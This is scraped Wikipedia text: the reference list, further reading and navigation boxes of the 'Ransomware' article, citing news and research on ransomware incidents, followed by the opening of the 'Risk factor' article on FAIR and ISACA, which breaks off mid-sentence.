Ars Technica
. 25 June 2015
. Retrieved 
25 June
 2015
.




^
 
"Internet Crime Report 2020"
 
(PDF)
. 
Ic3.gov
. Retrieved 
1 March
 2022
.




^
 
"Number of ransomware attacks per year 2022"
. 
Statista
. Retrieved 
4 June
 2023
.




^ 
a
 
b
 
Young, Adam L.; Yung, Moti (2017). 
"Cryptovirology: The Birth, Neglect, and Explosion of Ransomware"
. 
Communications of the ACM
. 
60
 (7): 24–26. 
doi
:
10.1145/3097347
. 
S2CID
 
232783395
. Retrieved 
27 June
 2017
.




^ 
a
 
b
 
"Ransomware squeezes users with bogus Windows activation demand"
. 
Computerworld
. 11 April 2011. Archived from 
the original
 on 3 July 2014
. Retrieved 
9 March
 2012
.




^ 
a
 
b
 
"Police warn of extortion messages sent in their name"
. 
Helsingin Sanomat
. Retrieved 
9 March
 2012
.




^ 
a
 
b
 
McMillian, Robert (31 August 2010). 
"Alleged Ransomware Gang Investigated by Moscow Police"
. 
PC World
. Archived from 
the original
 on 4 November 2010
. Retrieved 
10 March
 2012
.




^
 
"Ransomware: Fake Federal German Police (BKA) notice"
. SecureList (Kaspersky Lab)
. Retrieved 
10 March
 2012
.




^
 
"And Now, an MBR Ransomware"
. SecureList (Kaspersky Lab)
. Retrieved 
10 March
 2012
.




^
 
Adam Young (2005). Zhou, Jianying; Lopez, Javier (eds.). "Building a Cryptovirus Using Microsoft's Cryptographic API". 
Information Security: 8th International Conference, ISC 2005
. 
Springer-Verlag
. pp. 389–401.




^
 
Young, Adam (2006). "Cryptoviral Extortion Using Microsoft's Crypto API: Can Crypto APIs Help the Enemy?". 
International Journal of Information Security
. 
5
 (2): 67–76. 
doi
:
10.1007/s10207-006-0082-7
. 
S2CID
 
12990192
.




^
 
Danchev, Dancho (22 April 2009). 
"New ransomware locks PCs, demands premium SMS for removal"
. 
ZDNet
. Archived from 
the original
 on 26 April 2009
. Retrieved 
2 May
 2009
.




^
 
"Ransomware plays pirated Windows card, demands $143"
. 
Computerworld
. 6 September 2011. Archived from 
the original
 on 3 July 2014
. Retrieved 
9 March
 2012
.




^
 
Cheng, Jacqui (18 July 2007). 
"New Trojans: give us $300, or the data gets it!"
. 
Ars Technica
. Retrieved 
16 April
 2009
.




^ 
a
 
b
 
c
 
"You're infected—if you want to see your data again, pay us $300 in Bitcoins"
. 
Ars Technica
. 17 October 2013
. Retrieved 
23 October
 2013
.




^ 
a
 
b
 
"CryptoDefense ransomware leaves decryption key accessible"
. 
Computerworld
. IDG. April 2014. Archived from 
the original
 on 3 July 2014
. Retrieved 
7 April
 2014
.




^
 
"What to do if Ransomware Attacks on your Windows Computer?"
. 
Techie Motto
. Archived from 
the original
 on 23 May 2016
. Retrieved 
25 April
 2016
.




^
 
Adam, Sally (12 May 2020). 
"The state of ransomware 2020"
. 
Sophos News
. Retrieved 
18 September
 2020
.




^
 
Kassner, Michael. 
"Ransomware: Extortion via the Internet"
. 
TechRepublic
. Retrieved 
10 March
 2012
.




^
 
Sebastiaan von Solms; David Naccache (1992). 
"On Blind 'Signatures and Perfect Crimes"
 
(PDF)
. 
Computers & Security
. 
11
 (6): 581–583. 
doi
:
10.1016/0167-4048(92)90193-U
. 
S2CID
 
23153906
. Archived from 
the original
 
(PDF)
 on 26 October 2017
. Retrieved 
25 October
 2017
.




^
 
Schaibly, Susan (26 September 2005). 
"Files for ransom"
. 
Network World
. Retrieved 
17 April
 2009
.




^
 
Leyden, John (24 July 2006). 
"Ransomware getting harder to break"
. 
The Register
. Retrieved 
18 April
 2009
.




^
 
Naraine, Ryan (6 June 2008). 
"Blackmail ransomware returns with 1024-bit encryption key"
. 
ZDNet
. Archived from 
the original
 on 3 August 2008
. Retrieved 
3 May
 2009
.




^
 
Lemos, Robert (13 June 2008). 
"Ransomware resisting crypto cracking efforts"
. 
SecurityFocus
. Retrieved 
18 April
 2009
.




^
 
Krebs, Brian (9 June 2008). 
"Ransomware Encrypts Victim Files with 1,024-Bit Key"
. 
The Washington Post
. Archived from 
the original
 on 5 February 2013
. Retrieved 
16 April
 2009
.




^
 
"Kaspersky Lab reports a new and dangerous blackmailing virus"
. 
Kaspersky Lab
. 5 June 2008
. Retrieved 
11 June
 2008
.




^
 
Violet Blue
 (22 December 2013). 
"CryptoLocker's crimewave: A trail of millions in laundered Bitcoin"
. 
ZDNet
. Retrieved 
23 December
 2013
.




^ 
a
 
b
 
"Encryption goof fixed in TorrentLocker file-locking malware"
. 
PC World
. 17 September 2014
. Retrieved 
15 October
 2014
.




^
 
"Cryptolocker 2.0 – new version, or copycat?"
. 
WeLiveSecurity
. ESET. 19 December 2013
. Retrieved 
18 January
 2014
.




^
 
"New CryptoLocker Spreads via Removable Drives"
. Trend Micro. 26 December 2013. Archived from 
the original
 on 4 November 2016
. Retrieved 
18 January
 2014
.




^
 
"Synology NAS devices targeted by hackers, demand Bitcoin ransom to decrypt files"
. 
ExtremeTech
. Ziff Davis Media. Archived from 
the original
 on 19 August 2014
. Retrieved 
18 August
 2014
.




^
 
"File-encrypting ransomware starts targeting Linux web servers"
. 
PC World
. IDG. 9 November 2015
. Retrieved 
31 May
 2016
.




^
 
"Cybercriminals Encrypt Website Databases in "RansomWeb" Attacks"
. 
SecurityWeek
. Archived from 
the original
 on 20 April 2017
. Retrieved 
31 May
 2016
.




^
 
"Hackers holding websites to ransom by switching their encryption keys"
. 
The Guardian
. Retrieved 
31 May
 2016
.




^
 
Burgess, Matt. 
"Conti's Attack Against Costa Rica Sparks a New Ransomware Era"
. 
Wired
. 
ISSN
 
1059-1028
. Retrieved 
11 July
 2024
.




^
 
"President Rodrigo Chaves says Costa Rica is at war with Conti hackers"
. 18 May 2022
. Retrieved 
11 July
 2024
.




^
 
"The new .LNK between spam and Locky infection"
. 
Blogs.technet.microsoft.com
. 19 October 2016
. Retrieved 
25 October
 2017
.




^
 
Muncaster, Phil (13 April 2016). 
"PowerShell Exploits Spotted in Over a Third of Attacks"
.




^
 
"New ransomware employs Tor to stay hidden from security"
. 
The Guardian
. Retrieved 
31 May
 2016
.




^ 
a
 
b
 
"The current state of ransomware: CTB-Locker"
. 
Sophos Blog
. Sophos. 31 December 2015
. Retrieved 
31 May
 2016
.




^
 
Brook, Chris (4 June 2015). 
"Author Behind Ransomware Tox Calls it Quits, Sells Platform"
. Retrieved 
6 August
 2015
.




^
 
Dela Paz, Roland (29 July 2015). 
"Encryptor RaaS: Yet another new Ransomware-as-a-Service on the Block"
. Archived from 
the original
 on 2 August 2015
. Retrieved 
6 August
 2015
.




^
 
"Symantec classifies ransomware as the most dangerous cyber threat – Tech2"
. 22 September 2016. Archived from 
the original
 on 25 April 2017
. Retrieved 
22 September
 2016
.




^
 
Leyden, John. 
"Russian cops cuff 10 ransomware Trojan suspects"
. 
The Register
. Retrieved 
10 March
 2012
.




^ 
a
 
b
 
O'Gorman, G.; McDonald, G. (2012), 
Ransonmware: A Growing Menace
 
(PDF)
, Symantec Security Response, Symantec Corporation
, retrieved 
5 October
 2019




^
 
"Criminals push ransomware hosted on GitHub and SourceForge pages by spamming 'fake nude pics' of celebrities"
. 
TheNextWeb
. 7 February 2013
. Retrieved 
17 July
 2013
.




^
 
"New OS X malware holds Macs for ransom, demands $300 fine to the FBI for 'viewing or distributing' porn"
. 
TheNextWeb
. 15 July 2013
. Retrieved 
17 July
 2013
.




^
 
"Man gets ransomware porn pop-up, goes to cops, gets arrested on child porn charges"
. 
Ars Technica
. 26 July 2013
. Retrieved 
31 July
 2013
.




^
 
Young, A. (2003). 
Non-Zero Sum Games and Survivable Malware
. IEEE Systems, Man and Cybernetics Society Information Assurance Workshop. pp. 24–29.




^
 
A. Young, 
M. Yung
 (2004). 
Malicious Cryptography: Exposing Cryptovirology
. Wiley. 
ISBN
 
978-0-7645-4975-5
.




^
 
Arntz, Pieter (10 July 2020). 
"Threat spotlight: WastedLocker, customized ransomware"
. 
Malwarebytes Labs
. Retrieved 
27 July
 2020
.




^
 
Ricker, Thomas (27 July 2020). 
"Garmin confirms cyber attack as fitness tracking systems come back online"
. 
The Verge
. Retrieved 
27 July
 2020
.




^ 
a
 
b
 
"Ransomware on mobile devices: knock-knock-block"
. 
Kaspersky Lab
. 29 June 2016
. Retrieved 
6 December
 2016
.




^ 
a
 
b
 
"Your Android phone viewed illegal porn. To unlock it, pay a $300 fine"
. 
Ars Technica
. 6 May 2014
. Retrieved 
9 April
 2017
.




^
 
"New Android ransomware uses clickjacking to gain admin privileges"
. 
PC World
. 27 January 2016
. Retrieved 
9 April
 2017
.




^
 
"Here's How to Overcome Newly Discovered iPhone Ransomware"
. 
Fortune
. Retrieved 
9 April
 2017
.




^
 
"Ransomware scammers exploited Safari bug to extort porn-viewing iOS users"
. 
Ars Technica
. 28 March 2017
. Retrieved 
9 April
 2017
.




^
 
Al-Hawawreh, Muna; den Hartog, Frank; Sitnikova, Elena (2019). "Targeted Ransomware: A New Cyber Threat to Edge System of Brownfield Industrial Internet of Things". 
IEEE Internet of Things Journal
. 
6
 (4): 7137–7151. 
doi
:
10.1109/JIOT.2019.2914390
. 
S2CID
 
155469264
.




^
 
Palmer, Danny. 
"This is how ransomware could infect your digital camera"
. 
ZDNet
. Retrieved 
13 August
 2019
.




^
 
Robeznieks, A. (2017). 
"Ransomware Turning Healthcare Cybersecurity Into a Patient Care Issue"
. 
Healthcare Business News
. Healthcare Financial Management Association. Archived from 
the original
 on 16 June 2017.




^
 
Heater, Brian (13 April 2016), 
"The Growing Threat of Ransomware"
 
(PDF)
, 
PC Magazine
, retrieved 
5 October
 2019




^
 
"Activity begins to drop, but remains a challenge for organizations"
, 
Internet Security Threat Report (ISTR) 2019
, vol. 24, Symantec Corporation, p. 16, 2019
, retrieved 
5 October
 2019




^
 
Dudley, Renee (17 July 2023). 
"Who are the ransomware gangs wreaking havoc on the world's biggest companies?"
. 
The Guardian
.




^
 
First death reported following a ransomware attack on a German hospital
, 
ZDNet
, retrieved 
5 October
 2020




^
 
Beaman, Craig; Barkworth, Ashley; Akande, Toluwalope David; Hakak, Saqib; Khan, Muhammad Khurram (1 December 2021). 
"Ransomware: Recent advances, analysis, challenges and future research directions"
. 
Computers & Security
. 
111
: 102490. 
doi
:
10.1016/j.cose.2021.102490
. 
ISSN
 
0167-4048
. 
PMC
 
8463105
. 
PMID
 
34602684
.




^
 
"Gardaí warn of 'Police Trojan' computer locking virus"
. 
TheJournal.ie
. 15 June 2012
. Retrieved 
31 May
 2016
.




^
 
"Barrie computer expert seeing an increase in the effects of the new ransomware"
. 
Barrie Examiner
. Postmedia Network
. Retrieved 
31 May
 2016
.




^
 
"Fake cop Trojan 'detects offensive materials' on PCs, demands money"
. 
The Register
. Retrieved 
15 August
 2012
.




^ 
a
 
b
 
"Reveton Malware Freezes PCs, Demands Payment"
. 
InformationWeek
. Retrieved 
16 August
 2012
.




^
 
Dunn, John E. 
"Police alert after ransom Trojan locks up 1,100 PCs"
. TechWorld. Archived from 
the original
 on 2 July 2014
. Retrieved 
16 August
 2012
.




^
 
Constantian, Lucian (9 May 2012). 
"Police-themed Ransomware Starts Targeting US and Canadian Users"
. 
PC World
. Retrieved 
11 May
 2012
.




^
 
"Reveton 'police ransom' malware gang head arrested in Dubai"
. 
TechWorld
. Archived from 
the original
 on 14 December 2014
. Retrieved 
18 October
 2014
.




^
 
"
'Reveton' ransomware upgraded with powerful password stealer"
. 
PC World
. 19 August 2014
. Retrieved 
18 October
 2014
.




^
 
"Disk encrypting Cryptolocker malware demands $300 to decrypt your files"
. 
Geek.com
. 11 September 2013. Archived from 
the original
 on 4 November 2016
. Retrieved 
12 September
 2013
.




^
 
Ferguson, Donna (19 October 2013). 
"CryptoLocker attacks that hold your computer to ransom"
. 
The Guardian
. Retrieved 
23 October
 2013
.




^
 
"Destructive malware "CryptoLocker" on the loose – here's what to do"
. 
Naked Security
. Sophos. 12 October 2013
. Retrieved 
23 October
 2013
.




^
 
"CryptoLocker crooks charge 10 Bitcoins for second-chance decryption service"
. 
NetworkWorld
. 4 November 2013. Archived from 
the original
 on 5 November 2013
. Retrieved 
5 November
 2013
.




^
 
"CryptoLocker creators try to extort even more money from victims with new service"
. 
PC World
. 4 November 2013
. Retrieved 
5 November
 2013
.




^
 
"Wham bam: Global Operation Tovar whacks CryptoLocker ransomware & GameOver Zeus botnet"
. 
Computerworld
. IDG. Archived from 
the original
 on 3 July 2014
. Retrieved 
18 August
 2014
.




^
 
"U.S. Leads Multi-National Action Against "Gameover Zeus" Botnet and "Cryptolocker" Ransomware, Charges Botnet Administrator"
. 
Justice.gov
. U.S. Department of Justice
. Retrieved 
18 August
 2014
.




^
 
"Australians increasingly hit by global tide of cryptomalware"
. Symantec
. Retrieved 
15 October
 2014
.




^
 
Grubb, Ben (17 September 2014). 
"Hackers lock up thousands of Australian computers, demand ransom"
. 
Sydney Morning Herald
. Retrieved 
15 October
 2014
.




^
 
"Australia specifically targeted by Cryptolocker: Symantec"
. 
ARNnet
. 3 October 2014
. Retrieved 
15 October
 2014
.




^
 
"Scammers use Australia Post to mask email attacks"
. 
Sydney Morning Herald
. 15 October 2014
. Retrieved 
15 October
 2014
.




^
 
Steve Ragan (7 October 2014). 
"Ransomware attack knocks TV station off air"
. 
CSO
. Archived from 
the original
 on 12 October 2016
. Retrieved 
15 October
 2014
.




^
 
"Over 9,000 PCs in Australia infected by TorrentLocker ransomware"
. 
CSO.com.au
. 17 December 2014
. Retrieved 
18 December
 2014
.




^
 
"Malvertising campaign delivers digitally signed CryptoWall ransomware"
. 
PC World
. 29 September 2014
. Retrieved 
25 June
 2015
.




^
 
"CryptoWall 3.0 Ransomware Partners With FAREIT Spyware"
. Trend Micro. 20 March 2015
. Retrieved 
25 June
 2015
.




^
 
Andra Zaharia (5 November 2015). 
"Security Alert: CryptoWall 4.0 – new, enhanced and more difficult to detect"
. 
HEIMDAL
. Retrieved 
5 January
 2016
.




^
 
"Ransomware on mobile devices: knock-knock-block"
. 
Kaspersky Lab
. 29 June 2016
. Retrieved 
4 December
 2016
.




^
 
"The evolution of mobile ransomware"
. 
Avast
. Retrieved 
4 December
 2016
.




^
 
"Mobile ransomware use jumps, blocking access to phones"
. 
PCWorld
. IDG Consumer & SMB. 30 June 2016
. Retrieved 
4 December
 2016
.




^
 
"Cyber-attack: Europol says it was unprecedented in scale"
. 
BBC News
. 13 May 2017
. Retrieved 
13 May
 2017
.




^
 
"
'Unprecedented' cyberattack hits 200,000 in at least 150 countries, and the threat is escalating"
. CNBC. 14 May 2017. Archived from 
the original
 on 15 May 2017
. Retrieved 
16 May
 2017
.




^
 
"The real victim of ransomware: Your local corner store"
. 
CNET
. Retrieved 
22 May
 2017
.




^
 
Marsh, Sarah (12 May 2017). 
"The NHS trusts hit by malware – full list"
. 
The Guardian
. Retrieved 
12 May
 2017
.




^
 
"Honda halts Japan car plant after WannaCry virus hits computer network"
. 
Reuters
. 21 June 2017
. Retrieved 
21 June
 2017
.




^
 
"The Latest: Russian Interior Ministry is hit by cyberattack"
. 
WTHR
.




^
 
Scott, Paul Mozur, Mark; Goel, Vindu (19 May 2017). 
"Victims Call Hackers' Bluff as Ransomware Deadline Nears"
. 
The New York Times
. 
ISSN
 
0362-4331
. Retrieved 
22 May
 2017
.
{{
cite news
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
Constantin, Lucian. 
"Petya ransomware is now double the trouble"
. 
NetworkWorld
. Retrieved 
27 June
 2017
.




^
 
"Ransomware Statistics for 2018 | Safety Detective"
. 
Safety Detective
. 23 October 2018
. Retrieved 
20 November
 2018
.




^
 
"Tuesday's massive ransomware outbreak was, in fact, something much worse"
. 
Ars Technica
. 28 June 2017
. Retrieved 
28 June
 2017
.




^
 
"Cyber-attack was about data and not money, say experts"
. 
BBC News
. 29 June 2017
. Retrieved 
29 June
 2017
.




^
 
"
'Bad Rabbit' ransomware strikes Ukraine and Russia"
. 
BBC
. 24 October 2017
. Retrieved 
24 October
 2017
.




^
 
Hern, Alex (25 October 2017). 
"Bad Rabbit: Game of Thrones-referencing ransomware hits Europe"
. 
Theguardian.com
. Retrieved 
25 October
 2017
.




^ 
a
 
b
 
c
 
Larson, Selena (25 October 2017). 
"New ransomware attack hits Russia and spreads around globe"
. 
CNN
. Retrieved 
25 October
 2017
.




^
 
"BadRabbit: a closer look at the new version of Petya/NotPetya"
. 
Malwarebytes Labs
. 24 October 2017
. Retrieved 
31 July
 2019
.




^
 
Palmer, Danny. 
"Bad Rabbit: Ten things you need to know about the latest ransomware outbreak"
. 
ZDNet
. Retrieved 
31 July
 2019
.




^
 
Cameron, Dell (24 October 2017). 
"
'Bad Rabbit' Ransomware Strikes Russia and Ukraine"
. 
Gizmodo
. Retrieved 
24 October
 2017
.




^
 
Palmer, Danny (24 October 2017). 
"Bad Rabbit ransomware: A new variant of Petya is spreading, warn researchers"
. 
ZDNet
. Retrieved 
24 October
 2017
.




^
 
Rashid, Fahmida Y. (19 April 2016). 
"Patch JBoss now to prevent SamSam ransomware attacks"
. 
InfoWorld
. IDG
. Retrieved 
23 July
 2018
.




^ 
a
 
b
 
Crowe, Jonathan (March 2018). 
"City of Atlanta Hit with SamSam Ransomware: 5 Key Things to Know"
. 
Barkley vs Malware
. Barkley Protects, Inc. Archived from 
the original
 on 18 July 2018
. Retrieved 
18 July
 2018
.




^
 
Federal Bureau of Investigation
, 
Wanted by the FBI: SamSam Subjects
 
(PDF)
, U.S. Department of Justice
, retrieved 
5 October
 2019




^
 
"Two Iranian Men Indicted for Deploying Ransomware to Extort Hospitals, Municipalities, and Public Institutions, Causing Over $30 Million in Losses"
 (Press release). United States Department of Justice. 28 November 2018
. Retrieved 
11 December
 2018
.




^
 
Whittaker, Zack. 
"We talked to Windows tech support scammers. Here's why you shouldn't"
. 
ZDNet
. Retrieved 
6 November
 2019
.




^
 
"Windows 10 Fall Creators Update: syskey.exe support dropped"
. 
gHacks
. 26 June 2017
. Retrieved 
6 November
 2019
.




^
 
"Syskey.exe utility is no longer supported in Windows 10, Windows Server 2016 and Windows Server 2019"
. Microsoft
. Retrieved 
6 November
 2019
.




^
 
"Russian-based ransomware group 'REvil' disappears after hitting US businesses"
. 
The Independent
. 13 July 2021.




^
 
"Prolific ransomware gang suddenly disappears from internet. The timing is noteworthy"
. 
NBC News
. 14 July 2021.




^
 
"McAfee ATR Analyzes Sodinokibi aka REvil Ransomware-as-a-Service - The All-Stars"
. 2 October 2019.




^
 
"Biden tells Putin Russia must crack down on cybercriminals"
. 
AP NEWS
. 9 July 2021.




^
 
Sanger, David E. (13 July 2021). 
"Russia's most aggressive ransomware group disappeared. It's unclear who disabled them"
. 
The New York Times
. Archived from 
the original
 on 28 December 2021.




^
 
Brian Fung; Zachary Cohen; Geneva Sands (13 July 2021). 
"Ransomware gang that hit meat supplier mysteriously vanishes from the internet"
. 
CNN Business
.




^
 
Cannell, Joshua (8 October 2013). 
"Cryptolocker Ransomware: What You Need To Know, last updated 06/02/2014"
. 
Malwarebytes
 Unpacked
. 
Archived
 from the original on 30 September 2021
. Retrieved 
19 October
 2013
.




^
 
Leyden, Josh. 
"Fiendish CryptoLocker ransomware: Whatever you do, don't PAY"
. 
The Register
. 
Archived
 from the original on 13 August 2021
. Retrieved 
18 October
 2013
.




^
 
"Cryptolocker Infections on the Rise; US-CERT Issues Warning"
. 
SecurityWeek
. 19 November 2013. 
Archived
 from the original on 27 May 2021
. Retrieved 
18 January
 2014
.




^
 
Metin, Ozer. 
"Applying attack surface reduction"
. 
Comodo Cybersecurity
. 
Archived
 from the original on 5 October 2021
. Retrieved 
27 August
 2020
.




^
 
"Overview of attack surface reduction capabilities"
. 
Microsoft
. 
Archived
 from the original on 18 November 2021
. Retrieved 
6 February
 2020
.




^
 
"Comodo's patented "Kernel API Virtualization" – Under the Hood"
. 
Comodo Cybersecurity
. 
Archived
 from the original on 4 October 2021
. Retrieved 
27 August
 2020
.




^
 
"
'Petya' Ransomware Outbreak Goes Global"
. 
krebsonsecurity.com
. Krebs on Security. 28 June 2017
. Retrieved 
29 June
 2017
.




^
 
"How to protect yourself from Petya malware"
. 
CNET
. Retrieved 
29 June
 2017
.




^
 
"Petya ransomware attack: What you should do so that your security is not compromised"
. 
The Economic Times
. 29 June 2017
. Retrieved 
29 June
 2017
.




^
 
"New 'Petya' Ransomware Attack Spreads: What to Do"
. Tom's Guide. 27 June 2017
. Retrieved 
29 June
 2017
.




^
 
"India worst hit by Petya in APAC, 7th globally: Symantec"
. 
The Economic Times
. 29 June 2017
. Retrieved 
29 June
 2017
.




^
 
"TRA issues advice to protect against latest ransomware Petya | The National"
. 29 June 2017
. Retrieved 
29 June
 2017
.




^
 
"Petya Ransomware Spreading Via EternalBlue Exploit « Threat Research Blog"
. FireEye. Archived from 
the original
 on 13 February 2021
. Retrieved 
29 June
 2017
.




^ 
a
 
b
 
Chang, Yao-Chung (2012). 
Cybercrime in the Greater China Region: Regulatory Responses and Crime Prevention Across the Taiwan Strait
. Edward Elgar Publishing. 
ISBN
 
9780857936684
. Retrieved 
30 June
 2017
.




^
 
"Infection control for your computers: Protecting against cyber crime - GP Practice Management Blog"
. 
GP Practice Management Blog
. 18 May 2017
. Retrieved 
30 June
 2017
.




^
 
Piper, D.L.A. (2021). 
"Cybersecurity and Infrastructure Security Agency Releases Guidance Regarding Ransomware"
. 
Journal of Internet Law
. 
25
 (1): 1–17
. Retrieved 
3 December
 2023
.




^
 
"How to Turn On Ransomware Protection in Windows 10"
. 
WindowsLoop
. 8 May 2018
. Retrieved 
19 December
 2018
.




^
 
"Defeating CryptoLocker Attacks with ZFS"
. 
ixsystems.com
. 27 August 2015.




^
 
"List of free Ransomware Decryptor Tools to unlock files"
. 
Thewindowsclub.com
. Retrieved 
28 July
 2016
.




^
 
"Emsisoft Decrypter for HydraCrypt and UmbreCrypt Ransomware"
. 
Thewindowsclub.com
. 17 February 2016
. Retrieved 
28 July
 2016
.




^
 
"Ransomware removal tools"
. Retrieved 
19 September
 2017
.




^ 
a
 
b
 
c
 
d
 
e
 
Renee Dudley; Jeff Kao (15 May 2019). 
"The Trade Secret Firms That Promised High-Tech Ransomware Solutions Almost Always Just Pay the Hackers"
.




^
 
"About the Project - The No More Ransom Project"
. 
Archived
 from the original on 22 November 2021
. Retrieved 
3 December
 2021
.




^
 
"Crypto Sheriff - The No More Ransom Project"
. 
Archived
 from the original on 26 October 2021
. Retrieved 
3 December
 2021
.




^ 
a
 
b
 
c
 
"Zain Qaiser: Student jailed for blackmailing porn users worldwide"
. 
BBC News
. 9 April 2019.




^
 
"British hacker Zain Qaiser sentenced for blackmailing millions"
. 9 April 2019.




^
 
Cimpanu, Catalin. 
"Reveton ransomware distributor sentenced to six years in prison in the UK"
. 
ZDNet
.




^
 
"How police caught the UK's most notorious porn ransomware baron"
, Matt Burgess, 
Wired
, 12 Apr 2019]




^
 
"Angler by Lurk: Why the infamous cybercriminal group that stole millions was renting out its most powerful tool"
. 
usa.kaspersky.com
. 26 May 2021.




^
 
Nichols, Shaun (15 August 2018). 
"Florida Man laundered money for Reveton ransomware. Then Microsoft hired him in San Francisco"
. 
Theregister.com
.




^
 
Fields, Logan M. (25 February 2017). 
"The Minority Report – Week 7 – The Half-Way Point"
. World News.




^
 
Wei, Wang (6 June 2017). 
"14-Year-Old Japanese Boy Arrested for Creating Ransomware"
. The Hacker News.




^
 
Young, Adam L.; Yung, Moti (2005). 
"An Implementation of Cryptoviral Extortion Using Microsoft's Crypto API"
 
(PDF)
. Cryptovirology Labs. Archived from 
the original
 
(PDF)
 on 24 June 2016
. Retrieved 
16 August
 2017
.






Further reading
[
edit
]


Young, A.; 
Yung, M.
 (2004). 
Malicious Cryptography: Exposing Cryptovirology
. Wiley. 
ISBN
 
978-0-7645-4975-5
.


Russinovich
, Mark (7 January 2013). 
"Hunting Down and Killing Ransomware"
. 
Microsoft TechNet
. Microsoft.


Simonite, Tom (4 February 2015). 
"Holding Data Hostage: The Perfect Internet Crime? Ransomware (Scareware)"
. 
MIT Technology Review
. Archived from 
the original
 on 27 November 2015
. Retrieved 
5 February
 2015
.


Brad, Duncan (2 March 2015). 
"Exploit Kits and CryptoWall 3.0"
. The Rackspace Blog! & NewsRoom. Archived from 
the original
 on 24 September 2015
. Retrieved 
15 April
 2015
.


"Ransomware on the Rise: FBI and Partners Working to Combat This Cyber Threat"
. 
NEWS
. Federal Bureau of Investigation. 20 January 2015.


Yang, T.; Yang, Y.; Qian, K.; Lo, D.C.T.; Qian, L. & Tao, L. (2015). 
2015 IEEE 17th International Conference on High Performance Computing and Communications, 2015 IEEE 7th International Symposium on Cyberspace Safety and Security, and 2015 IEEE 12th International Conference on Embedded Software and Systems
. IEEE Internet of Things Journal, CONFERENCE, AUGUST 2015. pp. 1338–1343. 
doi
:
10.1109/HPCC-CSS-ICESS.2015.39
. 
ISBN
 
978-1-4799-8937-9
. 
S2CID
 
5374328
.


Richet, Jean-Loup (July 2015). 
"Extortion on the Internet: the Rise of Crypto-Ransomware"
 
(PDF)
. Harvard University.


Liska, Allan (20 October 2021). 
"Ransomware - Understand. Prevent. Recover"
. 
Recorded Future
. ActualTech Media.


External links
[
edit
]


 Media related to 
Ransomware
 at Wikimedia Commons


Incidents of Ransomware on the Rise
 – 
Federal Bureau of Investigation


The Extortion Economy / U.S. Companies and Ransomware


Ransomware Removal




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Software distribution
Licenses


Beerware


Floating licensing


Free and open-source


Free


Open source


Freely redistributable


License-free


Proprietary


Public domain


Source-available


Compensation models


Adware


Commercial software


Retail software


Crippleware


Crowdfunding


Freemium


Freeware


Pay what you want


Careware


Donationware


Open-core model


Postcardware


Shareware


Nagware


Trialware


Delivery methods


Digital distribution


File sharing


On-premises


Pre-installed


Product bundling


Retail software


Sneakernet


Software as a service


Deceptive and/or illicit


Unwanted software bundling


Malware


Infostealer


Ransomware


Spyware


Trojan horse


Worm


Scareware


Shovelware


Software release life cycle


Abandonware


End-of-life


Long-term support


Software maintenance


Software maintainer


Software publisher


Vaporware


list


Copy protection


Digital rights management


Software protection dongle


License manager


Product activation


Product key


Software copyright


Software license server


Software patent


Torrent poisoning




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast
















Retrieved from "
https://en.wikipedia.org/w/index.php?title=Ransomware&oldid=1244468388
"


Categories
: 
Ransomware
Types of malware
Security breaches
Hidden categories: 
CS1 maint: multiple names: authors list
Articles with short description
Short description is different from Wikidata
Use dmy dates from May 2016
All articles with vague or ambiguous time
Vague or ambiguous time from August 2023
Vague or ambiguous time from July 2021
Articles containing potentially dated statements from 2023
All articles containing potentially dated statements
All articles that may contain original research
Articles that may contain original research from June 2017
All articles with unsourced statements
Articles with unsourced statements from October 2023
Pages displaying short descriptions of redirect targets via Module:Annotated link
Pages displaying wikidata descriptions as a fallback via Module:Annotated link
Articles prone to spam from May 2016
Commons category link from Wikidata
Good articles











From Wikipedia, the free encyclopedia






This article is about Information security. For other uses, see 
Risk factor (disambiguation)
.


In 
information security
, 
risk factor
 is a collective name for circumstances affecting the 
likelihood
 or impact of a 
security risk
.





Definitions
[
edit
]


FAIR
[
edit
]


Main article: 
Factor Analysis of Information Risk § Risk


Factor Analysis of Information Risk
 (FAIR) is devoted to the analysis of different factors influencing 
IT risk
. It decompose at various levels, starting from the first level Loss Event Frequency and Probable Loss Magnitude, going on examining the 
asset
, the 
threat
 agent capability compared to the 
vulnerability (computing)
 and the 
security control
 (also called 
countermeasure
) strength, the probability that the agent get in contact and actually act against the asset, the organization capability to react to the event and the impact on stakeholders.



ISACA
[
edit
]


Risk factors are those factors that influence the frequency and/or business impact of risk scenarios; they can be of different natures, and can be classified in two major categories:
[
1
]




